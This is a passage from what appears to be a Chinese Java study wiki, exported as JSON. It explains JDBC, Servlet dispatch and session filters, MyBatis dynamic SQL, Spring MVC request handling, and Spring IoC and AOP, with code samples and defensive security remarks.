= new Properties(); prop.load(inputStream); url = prop.getProperty(url); user = prop.getProperty(user); password = prop.getProperty(password); catch (IOException e) throw new RuntimeException(e); public static Connection getConnection() throws SQLException return DriverManager.getConnection(url, user, password); 这段初始化代码包含四项职责： 配置外置化数据库地址、用户名、密码放进 db.properties，以后切换数据库环境时不用改 Java 源码。 类路径资源读取ClassLoader.getResourceAsStream(...) 从类路径读取配置，并对资源不存在的情况显式报错。 驱动注册与连接创建JDBC 4 驱动可以通过服务提供者机制自动注册，只要驱动依赖位于类路径中，通常无需再调用 Class.forName()。旧版驱动或特殊类加载环境需要另行核对。 工具类封装以后所有 DAO 都不再重复写一遍驱动加载和连接创建逻辑。 工具类里还保留了关闭资源的方法： public static void close(Connection connection, PreparedStatement preparedStatement, ResultSet resultSet) if (resultSet != null) resultSet.close(); if (preparedStatement != null) preparedStatement.close(); if (connection != null) connection.close(); 不过后面的 DAO 已经开始使用 try-with-resources，这也正好可以用来理解两代写法的差别： 写法 特点 手动 close() 早期常见，容易漏关资源 try-with-resources 更简洁，也更不容易遗漏 关闭顺序通常与创建顺序相反：先关 ResultSet，再关 PreparedStatement，最后关 Connection。更直接的做法是让三者都进入同一个 try-with-resources 声明。 Servlet 的动作分发BrandServlet 直接把这种思路写得很清楚： protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException req.setCharacterEncoding(UTF-8); String method = req.getParameter(method); if (method == null || method.equals()) method = getByPage; switch (method) case getBrandsAll: getBrandsAll(req, resp); break; case getBrandById: getBrandById(req, resp); break; case addBrand: addBrand(req, resp); break; case updateBrand: updateBrand(req, resp); break; case deleteBrand: deleteBrand(req, resp); break; case getByPage: getByPage(req, resp); break; 这种写法在早期 Servlet 应用中非常典型，从机制上看是： 一个 Servlet 作为统一入口 通过 method 参数决定执行哪个业务动作 每个动作再拆成单独的私有方法 这和后面 Spring MVC 的 @GetMapping、@PostMapping 其实是一脉相承的，只不过这里还需要手动做请求分发。 转发与重定向查询品牌详情时，代码使用的是转发： private void getBrandById(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException String id = req.getParameter(id); Brand brand = brandservice.getBrandById(Integer.parseInt(id)); req.setAttribute(brand, brand); req.getRequestDispatcher(brand_update.jsp).forward(req, resp); 新增、修改、删除之后，代码使用的是重定向： resp.sendRedirect(/brand?method=getByPage); 这两种写法最适合放在一起记： 写法 场景 特点 forward() 查询后进入展示页 服务器内部转发，请求对象可继续使用 sendRedirect() 新增、修改、删除后回列表 浏览器重新发起请求，地址栏会变化 增删改后常用 Post - Redirect - Get：表单提交完成后重定向到查询页面，刷新时重复的是 GET 请求，而不是原来的写操作。 Service 层的业务组织分页结果需要组合当前页数据和记录总数，这部分属于 Service 层的业务组织： public PageInfo getByPage(int pageNo, int pageSize) int offset = (pageNo - 1) * pageSize; ListBrand list = branddao.getByPage(offset, pageSize); int totalCount = branddao.getTotalCount(); int totalPage = (int) Math.ceil((double) totalCount / pageSize); PageInfo pageInfo = new PageInfo(list, totalPage, pageNo, pageSize); return pageInfo; 各层在分页中的职责如下： Servlet 负责接收参数 DAO 负责查数据 Service 负责把“当前页数据 + 总页数”组织成可用的分页结果 分页对象本身也很直观： public class PageInfo private ListBrand list; private int totalPage; private int pageNo; private int pageSize; 这其实就是把页面展示关心的数据单独收拢出来。 Service 层还应承担事务边界。一个业务动作包含多条 SQL 时，例如扣库存、写订单和写明细，这些操作应由同一个 Service 方法统一提交或回滚。 DAO 层的 JDBC 流程品牌分页查询的 DAO 写法非常有代表性： public ListBrand getByPage(int offset, int pageSize) String sql = select * from tb_brand limit ?,?; ListBrand list = new ArrayListBrand(); try( Connection conn = JDBCUtil.getConnection(); PreparedStatement pr = conn.prepareStatement(sql) ) pr.setInt(1, offset); pr.setInt(2, pageSize); try (ResultSet rs = pr.executeQuery()) while(rs.next()) int id = rs.getInt(id); String brandName = rs.getString(brand_name); String companyName = rs.getString(company_name); int ordered = rs.getInt(ordered); String description = rs.getString(description); int status = rs.getInt(status); Brand b = new Brand(id, brandName, companyName, ordered, description, status); list.add(b); return list; catch (SQLException e) throw new RuntimeException(e); 这一段几乎就是原生 JDBC 的标准流程： 写 SQL 获取连接 创建 PreparedStatement 绑定参数 执行查询 遍历 ResultSet 手工映射成 Java 对象 PreparedStatement 将 SQL 结构与参数值分开： 占位符写法更清晰 参数绑定更安全 能降低字符串拼接 SQL 的风险 这里需要明确一点：PreparedStatement 不是为了少写字符串，而是为了把 SQL 模板和参数分开处理。参数不再直接拼到 SQL 文本中，数据库驱动会按参数位置绑定，这能显著降低 SQL 注入风险。 登录 DAO 的写法更能体现这一点： String sql = select * from user where username=? and password=?;try (Connection conn = JDBCUtil.getConnection();PreparedStatement pr = conn.prepareStatement(sql)) pr.setString(1, username); pr.setString(2, password); ResultSet rs = pr.executeQuery(); if (rs.next()) return new User( rs.getInt(id), rs.getString(username), rs.getString(password) ); 参数绑定和结果映射由代码显式完成，可以作为对照 MyBatis 参数绑定与对象映射的基础。 明文密码查询不能用于实际认证系统。密码应使用专门的自适应密码哈希算法保存；登录时先按用户名读取账号，再验证密码哈希，并结合失败次数限制、会话更新和审计措施。放入 Session 的用户信息也不应包含密码字段。 登录、注册与会话UserServlet 可以按动作和 HTTP 方法分发登录、注册与退出请求： switch (method) case login: if (GET.equals(req.getMethod())) showLogin(req, resp); else login(req, resp); break; case register: if (GET.equals(req.getMethod())) showRegister(req, resp); else register(req, resp); break; case logout: logout(req, resp); break; default: resp.sendError(404); 登录成功后建立 Session，失败时转发回登录页： User user = userService.login(username, password);if (user != null) HttpSession session = req.getSession(); session.setAttribute(user, user); resp.sendRedirect(req.getContextPath() + /index.jsp); else req.setAttribute(error, 用户名或密码错误); req.getRequestDispatcher(/login.jsp).forward(req, resp); 这里把几个高频知识点一次带出来了： HttpSession 用来保存登录状态 登录成功通常重定向到首页 登录失败通常转发回原页面并带上错误信息 req.getContextPath() 用来适配应用上下文路径 注册成功后重定向到登录入口： User user = new User(null, username, password);boolean ok = userService.register(user);if (ok) resp.sendRedirect(req.getContextPath() + /user?method=login); else req.setAttribute(error, 注册失败，用户名可能已存在); req.getRequestDispatcher(/register.jsp).forward(req, resp); DAO 层对重复用户名也做了处理： if (e.getMessage().contains(Duplicate entry)) System.out.println(注册失败：用户名已存在); return 0; 异常消息文本会随数据库和驱动版本变化，不能作为稳定的业务分支。用户名应由数据库唯一索引兜底，应用层捕获对应的 SQLState、厂商错误码或经过持久层转换后的明确异常。提前查询可以改善提示，但不能替代唯一约束，因为并发注册仍可能同时通过查询。 过滤器与访问控制LoginFilter 在请求进入业务 Servlet 前检查会话： String servletPath = req.getServletPath();String action = req.getParameter(method);boolean publicRequest = /login.jsp.equals(servletPath) || /register.jsp.equals(servletPath) || (/user.equals(servletPath) (login.equals(action) || register.equals(action))) || servletPath.startsWith(/css/) || servletPath.startsWith(/js/);if (publicRequest) filterChain.doFilter(req, resp); return;HttpSession session = req.getSession(false);Object user = (session != null) ? session.getAttribute(user) : null;if (user != null) filterChain.doFilter(req, resp); else resp.sendRedirect(req.getContextPath() + /login.jsp); 这里使用 req.getSession(false)，避免检查登录态时创建空 Session。 写法 含义 getSession() 没有 Session 也会创建一个新的 getSession(false) 没有就返回 null，不会新建 过滤器按以下顺序处理请求： 先判断当前请求是不是登录页、注册页或静态资源。 再检查 Session 中有没有 user。 有就继续执行。 没有就打回登录页。 getRequestURI() 不包含查询字符串，因此不能用 uri.contains(/user?method=login) 匹配动作参数。公开端点应按 servletPath 和参数分别判断，或者直接使用不同 URL 映射；放行规则也不能用过宽的 /user 包含判断代替授权。 JSP 中的分页与表单早期 JSP 页面可能直接使用 Scriptlet 遍历后端数据： % PageInfo pageInfo = (PageInfo) request.getAttribute(pageInfo);%% for (Brand brand : pageInfo.getList())%tr td%=brand.getId()%/td td%=brand.getBrandName()%/td td%=brand.getCompanyName()%/td td%=brand.getOrdered()%/td td%=brand.getDescription()%/td td%=brand.getStatus()%/td tda href=javascript:void(0) onclick=deleteBrand(%=brand.getId()%)删除/a/td tda href=/brand?method=getBrandByIdid=%=brand.getId()%编辑/a/td/tr% % 而登录页则已经开始使用 EL 表达式和 JSTL： form action=$pageContext.request.contextPath/user?method=login method=post 用户名：input name=usernamebr 密码：input type=password name=password/br button type=submit登录/button/formp style=color: red$error/p 两种页面写法的差异如下： 方式 典型写法 特点 Scriptlet % ... %、%= ... % 早期常见，Java 代码直接混进 JSP EL JSTL $error、标签库 表达更清晰，页面与 Java 代码耦合更低 EL 与 JSTL 可以减少页面中的 Java 代码。输出来自请求或数据库的文本时还要进行 HTML 转义，状态修改请求应使用 POST 等合适方法并加入 CSRF 防护，不能仅依赖 GET 链接。 框架对应关系MyBatis 接管 DAO 中的参数绑定与结果映射，Spring MVC 接管 Servlet 中的大量路由和参数转换工作。Servlet Filter 并未被拦截器取代：Filter 属于 Servlet 规范，可覆盖进入容器的请求；Spring MVC Interceptor 只作用于由 Spring MVC 处理的请求。 原生 JDBC 与 Servlet 代码显式展示了请求分发、资源管理、参数绑定和结果映射。MyBatis 与 Spring MVC 减少了这些模板代码，但没有取消对应的运行环节。","tags":[null,null]},{"title":"Java笔记42-MyBatis动态SQL","path":"/wiki/java/java-note-42.html","content":"MyBatis 保留显式 SQL，并统一处理参数绑定、结果映射、动态 SQL 和会话管理。 MyBatis 的核心部件这一套写法跑起来，通常离不开三层： 组成 作用 mybatis.xml 全局配置：数据源、别名、设置、映射文件位置 Mapper.xml 写 SQL、结果映射、动态 SQL SqlSession 执行 SQL 的会话对象 全局配置创建运行环境，Mapper 定义语句，SqlSession 提供执行与事务边界。 JDBC 模板代码的收拢原生 JDBC 最重复的部分通常包括连接获取、参数绑定、结果集遍历和对象封装。MyBatis 并没有把 SQL 隐藏起来，而是把这些重复模板抽走，让 SQL 本身能更清楚地保留下来。 JDBC: Java 代码里写 SQL + 手工绑定 + 手工映射MyBatis: XML/注解里写 SQL + 框架绑定 + 框架映射 所以 MyBatis 很适合需要掌控 SQL 的系统。它不像完全自动化 ORM 那样试图屏蔽 SQL，而是让 SQL 有一个更稳定的管理位置。 SqlSessionFactory 与 SqlSession工具类把创建过程统一封装了起来： public class MyBatisUtil private static SqlSessionFactory sqlSessionFactory; static try String resource = mybatis.xml; try (InputStream inputStream = Resources.getResourceAsStream(resource)) sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); catch (IOException e) throw new RuntimeException(e); public static SqlSession getSqlSession() SqlSession sqlSession = sqlSessionFactory.openSession(); return sqlSession; 三个对象的职责分别是： SqlSessionFactory 负责生产会话对象 SqlSession 负责执行增删改查 工具类负责避免重复创建工厂 静态初始化只创建一次 SqlSessionFactory。工厂可以在应用范围内复用，SqlSession 不是线程安全对象，应按操作或事务范围创建并关闭。 SqlSessionFactory 通常应该尽量复用，而 SqlSession 更接近一次数据库会话，不适合长期共享。后面接入 Spring 以后，SqlSession 的生命周期和事务边界会交给框架统一管理。 全局配置mybatis.xml 里最常用的部分几乎都在这几段： settings setting name=mapUnderscoreToCamelCase value=true//settingstypeAliases package name=com.java.pojo//typeAliases environments default=development environment id=development transactionManager type=JDBC/ dataSource type=POOLED property name=driver value=$db.driver/ property name=url value=jdbc:mysql://db-host:db-port/db-name?characterEncoding=UTF-8/ property name=username value=$db.username/ property name=password value=$db.password/ /dataSource /environment/environments mappers mapper resource=mapper/BrandMapper.xml//mappers 这些配置各自负责的事情非常明确： 配置 作用 mapUnderscoreToCamelCase 数据库下划线字段自动映射到驼峰属性 typeAliases 给实体类起别名，XML 更简洁 transactionManager 事务管理方式 dataSource 数据源及连接池配置 mappers 告诉 MyBatis 去哪里找映射文件 mapUnderscoreToCamelCase 直接影响 brand_name - brandName 这类字段与属性的自动映射。 示例配置更适合保留这种占位写法，真实数据库地址、账号和密码应该放在独立配置或环境变量里，而不是直接写进项目文档或代码仓库。 Mapper 命名空间这里正好可以比较两种写法。 一种是： mapper namespace=brand 另一种是： mapper namespace=com.java.mapper.BrandMapper 这两种写法本质都在给 SQL 语句划归属，但风格不完全一样： namespace 写法 更像什么 brand 字符串式命名空间 com.java.mapper.BrandMapper 面向 Mapper 接口的命名空间 因此在测试里会看到这种调用： Brand brand = sqlSession.selectOne(brand.selectById, 1); 接口代理模式使用 Mapper 接口方法代替字符串形式的语句调用。 Mapper 接口代理模式的关键，是让 namespace 对应接口全限定名，让 SQL 的 id 对应接口方法名。这样 MyBatis 才能根据方法调用定位到具体 SQL。 BrandMapper.selectById() ↓namespace + id ↓mapper XML 中的 selectById CRUD、参数绑定与结果映射按主键查询： select id=selectById parameterType=int resultType=Brand SELECT id,brand_name,company_name,ordered,description,status FROM tb_brand WHERE id=#id/select 插入： insert id=insert parameterType=Brand INSERT INTO tb_brand( brand_name,company_name,ordered,description,status) VALUES (#brandName,#companyName,#ordered,#description,#status)/insert 更新： update id=update parameterType=Brand UPDATE tb_brand SET brand_name = #brandName, company_name= #companyName, ordered = #ordered, description = #description, status = #status WHERE id = #id/update 这几段 SQL 和原生 JDBC 最大的不同，不在 SQL 本身，而在于： 不再手写 PreparedStatement 不再手工 rs.getString(...) 映射每一列 参数通过 # 自动绑定 这里要特别区分 # 和 $： 写法 含义 风险 # 参数预编译绑定 更安全，常规参数优先使用 $ 字符串直接拼接 有 SQL 注入风险，只适合少数动态表名、排序字段等场景 # 对应 JDBC 参数绑定；$ 会把文本直接拼入 SQL。动态表名或排序字段必须来自服务端白名单，不能直接接受用户输入。 resultType 与 resultMap简单查询时，直接用 resultType 很方便： select id=selectAll resultType=Brand SELECT * FROM tb_brand/select 但当字段映射更复杂时，resultMap 会更稳： resultMap id=brandMap type=Brand id column=id property=id/ result column=brand_name property=brandName/ result column=company_name property=companyName/ result column=ordered property=ordered/ result column=description property=description/ result column=status property=status//resultMap 再配合公共 SQL 片段： sql id=brandColumns id,brand_name,company_name,ordered,description,status/sql SELECT include refid=brandColumns/FROM tb_brand 这几段放在一起，刚好能理解三件事： resultType 适合简单场景 resultMap 适合更明确、更可控的字段映射 sql 与 include 用来提取可复用 SQL 片段 动态 SQLwhere 与 if。 条件查询最经典的写法之一： select id=selectByCondition1 parameterType=map resultType=Brand SELECT * FROM tb_brand where if test=brandName != null and brandName != AND brand_name LIKE CONCAT(%,#brandName,%) /if if test=companyName != null and companyName != AND company_name LIKE CONCAT(%,#companyName,%) /if if test=ordered != null AND ordered = #ordered /if /where/select where 仅在内部产生内容时生成 WHERE，并移除开头多余的 AND 或 OR。 set。 更新时最怕把没传的字段也一起改掉： update id=updateCondition parameterType=Brand UPDATE tb_brand set if test=brandName != null brand_name = #brandName, /if if test=companyName != null company_name = #companyName, /if if test=ordered != null ordered = #ordered, /if /set WHERE id = #id/update set 会生成 SET 并去掉末尾逗号。若所有字段都为空，最终 SQL 仍会无效，因此 Service 层应拒绝没有更新字段的请求。 foreach。 批量删除时，foreach 很有代表性： delete id=deleteArray DELETE FROM tb_brand WHERE id IN foreach collection=array open=( item=id close=) separator=, #id /foreach/delete 调用前应处理空数组或空集合，避免生成 WHERE id IN ()。 choose。 当多个条件只想命中其中一个时： select id=selectByCondition2 parameterType=Brand resultType=Brand SELECT * FROM tb_brand WHERE choose when test=brandName!=null and brandName!= brand_name LIKE CONCAT(%,#brandName,%) /when when test=companyName!=null and companyName!= company_name LIKE CONCAT(%,#companyName,%) /when when test=ordered!=null ordered = #ordered /when otherwise 1=1 /otherwise /choose/select 它更像 SQL 里的“条件择一”。 trim。 trim 最像一个更通用的动态拼接工具： trim prefix=( suffix=) suffixOverrides=, if test=brandName != nullbrand_name,/if if test=companyName != nullcompany_name,/if if test=ordered != nullordered,/if/trim trim 最适合处理： 前缀 后缀 多余逗号 多余 AND / OR bind。 模糊查询中，bind 很适合把变量先准备好： select id=selectByName parameterType=string resultType=Brand SELECT * FROM tb_brand where bind name=pattern value=%+_parameter+%/ brand_name LIKE #pattern /where/select 这样写的好处是，模糊查询拼接逻辑更集中，不必把 % 到处散着写。 动态 SQL 标签对照 标签 常见用途 if 条件成立时才拼接某段 SQL where 自动处理 WHERE 与首个 AND set 动态更新字段，并去掉最后逗号 foreach 处理数组、集合、批量操作 choose 多条件中择一命中 trim 更通用的前后缀与裁剪控制 bind 先定义变量，再参与 SQL 这些标签负责生成 SQL 结构，参数值仍应通过 # 绑定。 测试中的会话生命周期例如按主键查询： SqlSession sqlSession = MyBatisUtil.getSqlSession();Brand brand = sqlSession.selectOne(brand.selectById, 1);System.out.println(brand); 分页查询： int pageNo = 2;int pageSize = 3;int offset = (pageNo - 1) * pageSize;MapString, Integer map = new HashMap();map.put(offset, offset);map.put(pageSize, pageSize);ListBrand list = sqlSession.selectList(brand.selectPage, map); 批量删除： int[] array = 14, 15;sqlSession.delete(brand.deleteArray, array);sqlSession.commit();sqlSession.close(); 测试也应使用 try-with-resources 关闭 SqlSession，并在写操作成功后提交事务。 事务提交MyBatis 默认创建的 JDBC 事务会话通常不会自动提交写操作： // JDBC默认的autocommit是true,但是MyBatis对此设置默认值为false,// 当执行增删改操作时,MyBatis要求手动提交更新类操作SqlSession sqlSession = MyBatisUtil.getSqlSession();Brand brand = new Brand(null,小米,米,100,null,0);int count = sqlSession.insert(brand.insert, brand);sqlSession.commit();sqlSession.close(); 会话的提交行为如下： 操作 常见处理 查询 通常直接执行即可 增删改 通常要显式 commit() 如果忘记提交，会出现“代码看起来执行了，但数据库没变”的典型现象。 MyBatis 与 JDBC 的职责对照 对比项 JDBC MyBatis SQL 放在哪里 Java 字符串里 XML 或注解中 参数绑定 手工 PreparedStatement # 自动绑定 结果映射 手工遍历 ResultSet resultType resultMap 动态查询 手工字符串拼接 动态 SQL 标签 会话管理 Connection SqlSession 也正因为 MyBatis 仍然保留 SQL，所以它特别适合当作 JDBC 和更高层 ORM 之间的过渡层。 运行边界 用 mybatis.xml 管全局配置 用 Mapper.xml 管 SQL 和映射 用 SqlSession 执行语句 用动态 SQL 解决条件拼接和批量操作 MyBatis 的配置、动态 SQL 标签和会话对象分别承担映射、SQL 生成与执行边界；它们减少原生 JDBC 的模板代码，但数据库事务和 SQL 语义仍然存在。","tags":[null,null]},{"title":"Java笔记44-SpringMVC请求处理","path":"/wiki/java/java-note-44.html","content":"Spring MVC 解决的是表现层问题。它关注的不是“业务怎么做”，而是 HTTP 请求怎么进来、参数怎么绑定、结果怎么返回给页面或前端。 DispatcherServlet 入口传统部署方式的 Web 入口配置在 web.xml 里： filter filter-namecharacterEncoding/filter-name filter-classorg.springframework.web.filter.CharacterEncodingFilter/filter-class init-param param-nameencoding/param-name param-valueUTF-8/param-value /init-param/filter servlet servlet-namespringmvc/servlet-name servlet-classorg.springframework.web.servlet.DispatcherServlet/servlet-class init-param param-namecontextConfigLocation/param-name param-valueclasspath:springmvc.xml/param-value /init-param/servletservlet-mapping servlet-namespringmvc/servlet-name url-pattern//url-pattern/servlet-mapping 这几段配置带出的知识点很集中： 配置 作用 CharacterEncodingFilter 处理 POST 提交乱码 DispatcherServlet 前端控制器，统一接收请求 contextConfigLocation 指定 Spring MVC 配置文件 url-pattern 为 / 让 Spring MVC 接管大部分请求 所以 Spring MVC 的入口不是某个 Controller，而是 DispatcherServlet。 Spring MVC 请求处理链DispatcherServlet 被称为前端控制器，并不是因为它自己完成所有事情，而是因为它站在请求入口位置，负责调度 Spring MVC 内部的一组组件。一次请求进入之后，大致会经过下面这条链： DispatcherServlet ↓HandlerMapping 查找匹配的处理方法 ↓HandlerAdapter 调用 Controller 方法 ↓Controller 返回模型、视图名或响应数据 ↓ViewResolver 或 HttpMessageConverter 处理最终响应 HandlerMapping 建立路径与处理方法之间的映射；HandlerAdapter 配合参数解析器完成绑定并调用方法；响应阶段再由视图解析器或消息转换器处理返回值。 所以 Spring MVC 并不是简单把 Servlet 包了一层，而是把请求处理拆成了可扩展的多个环节。拦截器、参数绑定、数据校验、异常处理、JSON 转换，从机制上看都是在这条处理链上增加能力。 Web 层配置配置文件里主要的内容通常就这几块： context:component-scan base-package=com.java.controller/mvc:annotation-driven/ bean class=org.springframework.web.servlet.view.InternalResourceViewResolver property name=prefix value=// property name=suffix value=.jsp//bean 这三段可以直接对应三件事： 配置 含义 component-scan 扫描 @Controller mvc:annotation-driven 开启注解驱动和消息转换支持 InternalResourceViewResolver 把逻辑视图名拼成真实 JSP 路径 视图解析器会把逻辑视图名转换为 JSP 路径： modelAndView.setViewName(student_info); 如果前缀是 /，后缀是 .jsp，那么逻辑视图名最终就会被解析成： /student_info.jsp 参数绑定最基础的参数接收可以直接写普通参数： @RequestMapping(/add1)public void add1(String name, int age, String gender) System.out.println(name: + name); System.out.println(age: + age); System.out.println(gender: + gender); 更常见的是直接绑定到对象： @RequestMapping(/add)public ModelAndView add(Student student) ModelAndView modelAndView = new ModelAndView(); modelAndView.addObject(student, student); modelAndView.setViewName(student_info); return modelAndView; 对象参数可以由同名请求参数完成属性绑定： 前端参数按名字提交 Spring MVC 自动封装进 Student 开发者不再手工 req.getParameter() 一项一项取值 这就是所谓的数据绑定。 控制器返回模型与视图ModelAndView 同时保存模型数据和逻辑视图名： public ModelAndView add(Student student) ModelAndView modelAndView = new ModelAndView(); modelAndView.addObject(student, student); modelAndView.setViewName(student_info); return modelAndView; Model 参数保存数据，方法返回逻辑视图名： @PostMapping(/add3)public String add3(Student student, Model model) model.addAttribute(student, student); return student_info; 控制器也可以直接使用 Servlet API，但会增加对容器接口的依赖和样板代码： @PostMapping(/add4)public void add4(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException String name = req.getParameter(name); String age = req.getParameter(age); String gender = req.getParameter(gender); Student student = new Student(null, name, Integer.parseInt(age), gender); req.setAttribute(student, student); req.getRequestDispatcher(/student_info.jsp).forward(req, resp); 三种返回方式的差异如下： 写法 特点 ModelAndView 模型与视图放在一个对象里，结构清晰 Model + String 更轻量，更常见 原生 Servlet 自由但样板代码明显更多 转发与重定向删除场景用了 redirect:： @RequestMapping(/deleteById)public String deleteById(Integer id) System.out.println(id: + id); return redirect:/student/selectAll; 这说明 Spring MVC 里返回 String 不只是视图名，还可以带控制语义。 返回值 含义 student_info 交给视图解析器解析 redirect:/xxx 浏览器重定向到新地址 这一点和 Servlet 里的 forward sendRedirect 是可以一一对应起来的。 @ResponseBody 与消息转换@ResponseBody 改变返回值的处理方式： @RequestMapping(/selectById)// @ResponseBodypublic Student selectById(Integer id) Student student = new Student(1, 张三, 23, 男); return student; 当 @ResponseBody 打开之后，返回值就不再交给 JSP，而是直接写入响应体。配合 mvc:annotation-driven，对象通常会被转换成 JSON。 是否返回页面或响应体属于接口契约的一部分，不能仅按项目是否前后端分离判断。 与之经常一起出现的是 @RequestBody。@ResponseBody 关注的是“响应怎么写出去”，@RequestBody 关注的是“请求体怎么读进来”。表单提交时，参数通常来自 query string 或 form data；前端提交 JSON 时，请求数据通常在 body 中，这时就需要消息转换器把 JSON 反序列化成 Java 对象。二者方向不同，但都依赖 Spring MVC 的消息转换机制。 @RequestParam 参数约束分页参数可以声明默认值： @RequestMapping(/selectByPage)public String selectByPage(@RequestParam(defaultValue = 1) Integer pageNo,@RequestParam(defaultValue = 3) Integer pageSize,@RequestParam(defaultValue = 4) Integer totalPage) System.out.println(pageNo: + pageNo); System.out.println(pageSize: + pageSize); System.out.println(totalPage: + totalPage); return /student_info.jsp; @RequestParam 可以声明参数名、默认值和是否必填： 参数名映射 默认值 必填与否 相比手动判空，这种写法更接近“声明式参数处理”。 这里还有一个容易被忽略的细节：可选参数更适合使用 Integer、Long 这类包装类型，而不是 int、long 这样的基本类型。因为请求参数不存在时，包装类型可以接收 null，基本类型却无法表达“没有值”这个状态。如果方法参数又没有设置默认值，就很容易出现绑定失败。分页参数之所以常配合 defaultValue，正是为了让请求缺省时仍然有稳定的业务含义。 请求处理链把这一套代码串起来，请求的大致流向其实很清楚： 浏览器 - DispatcherServlet - Controller - Model/ModelAndView - 视图解析器或响应体 如果是页面返回： Controller 处理参数 把数据放进 Model 或 ModelAndView 视图解析器找到 JSP 如果是接口返回： Controller 处理参数 返回对象或数据 消息转换器序列化成 JSON 请求处理边界 环节 负责什么 DispatcherServlet 统一接收请求 HandlerMapping 找到匹配的控制器方法 Controller 处理请求参数和业务入口 Model ModelAndView 准备返回数据 视图解析器 定位页面 消息转换器 把对象转成响应内容 页面返回和 JSON 返回的判断应由接口契约决定。String 返回值在没有 @ResponseBody 时通常是视图名，加入消息转换后才会被序列化为响应数据；参数绑定还应结合校验和异常处理，不能只依赖 Integer.parseInt 等转换调用。","tags":[null,null]},{"title":"Java笔记43-Spring核心思想","path":"/wiki/java/java-note-43.html","content":"版本边界： 以下示例来自传统 Spring XML 配置路径，用于记录 IOC、DI 与 AOP 的机制。Spring 6 Spring Boot 3 项目通常采用 Java 配置和注解，复用代码前应核对项目依赖版本。 Spring 容器负责对象创建、依赖装配和生命周期管理；Spring AOP 通过代理把事务、日志等横切逻辑应用到匹配的方法调用。 IOC 与对象创建权传统写法里，经常会看到控制层直接依赖实现类： public class StudentController // private StudentService studentService = new StudentServiceImp(); private StudentService studentService; public void setStudentService(StudentService studentService) this.studentService = studentService; public void selectAll() System.out.println(StudentController.selectAll); studentService.selectAll(); Service 层也一样： public class StudentServiceImp implements StudentService // private StudentDao studentDao = new StudentDaoImp(); private StudentDao studentDao; public void setStudentDao(StudentDao studentDao) this.studentDao = studentDao; @Override public void selectAll() System.out.println(StudentServiceImp.selectAll); studentDao.selectAll(); 再往下是 DAO： public class StudentDaoImp implements StudentDao @Override public void selectAll() System.out.println(StudentDaoImp.selectAll); 移除业务类内部的实现类构造后，依赖改由容器提供： Controller 不再自己创建 Service Service 不再自己创建 DAO 对象的创建和组装交给容器完成 这就是所谓的 控制反转。对象不是“自己去找依赖”，而是“由容器把依赖注入进来”。 控制反转与依赖方向传统写法中，Controller 主动创建 Service，Service 主动创建 DAO。对象之间的依赖关系写死在代码里，替换实现时往往要修改源代码。 IOC 之后，业务对象不再主动控制依赖创建，而是把依赖声明出来，由容器统一装配。控制权从业务类转移到了 Spring 容器，这才是“反转”的含义。 传统写法：类主动 new 依赖IOC 写法：容器创建对象并注入依赖 DI 与容器装配依赖链如下： StudentController - StudentService - StudentDao 一旦换成 Spring 容器，重点就从“怎么 new”变成“怎么声明依赖”。 在 XML 时代，最直观的写法通常是： bean name=studentDao class=com.example.dao.StudentDaoImp/bean name=studentService class=com.example.service.StudentServiceImp property name=studentDao ref=studentDao//beanbean name=studentController class=com.example.controller.StudentController property name=studentService ref=studentService//bean value 与 ref 的作用不同： 属性 含义 value 注入普通值 ref 注入另一个 Bean 以上 XML 使用 setter 注入，因此类中需要对应的 setStudentService() 和 setStudentDao()。必需依赖也可以通过构造器注入，使对象在构造完成后即处于可用状态。 Bean 的作用域Spring 容器里最基础的 Bean 定义长这样： bean scope=singleton name=student class=com.java.pojo.Student/ 这行配置至少带出三件事： 这个对象由 Spring 容器创建 取对象时通过 name 查找 当前作用域是 singleton 可以通过两次查询同一 Bean 验证单例作用域： ApplicationContext context = new ClassPathXmlApplicationContext(applicationContext.xml);Student student1 = (Student) context.getBean(student);Student student2 = (Student) context.getBean(student);System.out.println(student1 == student2); 如果输出是 true，就说明两次拿到的是容器里的同一个单例对象。 两种基础作用域的差异如下： 作用域 特点 singleton 容器中默认单例 prototype 每次获取都会新建一个对象 Bean 生命周期Bean 进入容器后，大致会经历创建、属性注入、初始化、使用和销毁几个阶段。完整生命周期还包括 BeanPostProcessor 等扩展点；Spring 管理的不只是 new，还包括依赖注入、初始化回调、作用域和销毁时机。 只有进入容器生命周期并经过相关后处理器的 Bean，才会获得依赖注入、事务代理和 AOP 增强。 XML 配置与组件扫描组件扫描可以替代逐个声明业务 Bean： context:component-scan base-package=com.java/ 扫描范围内带有组件注解的类会被注册为 Bean。 常见组件注解如下： 注解 常见位置 @Controller 表现层 @Service 业务层 @Repository 持久层 @Component 通用组件 组件扫描只负责发现 Bean；依赖选择、作用域和生命周期仍由注解或配置声明。 代理与 AOP静态代理最直观： public class Proxy implements Rent private Host host; public Proxy(Host host) this.host = host; @Override public void rent() seeHouse(); host.rent(); fare(); 这里代理类做的事非常明确： 的业务还是 host.rent() 代理只是在方法前后补额外逻辑 这已经非常接近 AOP 的思路了。所谓横切关注点，从机制上看就是： 看房 收费 日志 权限 事务 这些逻辑并不属于核心业务本身，但又总想在方法前后执行。 动态代理JDK 动态代理的关键代码更像一个通用拦截器： public class ProxyIH implements InvocationHandler private Object object; public ProxyIH(Object object) this.object = object; public Object getProxy() return Proxy.newProxyInstance( this.getClass().getClassLoader(), object.getClass().getInterfaces(), this ); @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable seeHouse(); try return method.invoke(object, args); finally fare(); invoke() 的执行顺序如下： 先执行增强逻辑 再调用真实方法 最后再执行收尾逻辑 这就是 AOP 最朴素的运行模型。 代理方式 特点 静态代理 代理类手写出来，结构直观但重复多 JDK 动态代理 面向接口生成代理，更灵活 Spring AOP 从机制上看也是在做类似的事情，只不过代理的创建和织入由框架统一接管了。 如果目标类没有接口，Spring 还可能使用基于子类的代理方式。无论底层方式如何变化，核心目标都一样：让调用方拿到的不是原始对象本身，而是带增强能力的代理对象。 Spring AOP 的横切逻辑切面类可以把横切逻辑集中到一个组件中： public class AdviceAspect public void before() System.out.println(前置通知); public void after() System.out.println(后置通知); 配合 AOP 配置时，通常会围绕三个核心元素展开： 元素 作用 切点 Pointcut 从哪里切进去 通知 Advice 切进去以后执行什么 切面 Aspect 把切点和通知组织在一起 XML 可以使用 advisor 或 aspect 组织切点和通知： advisor 配置aop:config aop:pointcut id=pointcut expression=execution(* com.example.service.UserServiceImp.*(..))/ aop:advisor advice-ref=beforeAdvice pointcut-ref=pointcut/ aop:advisor 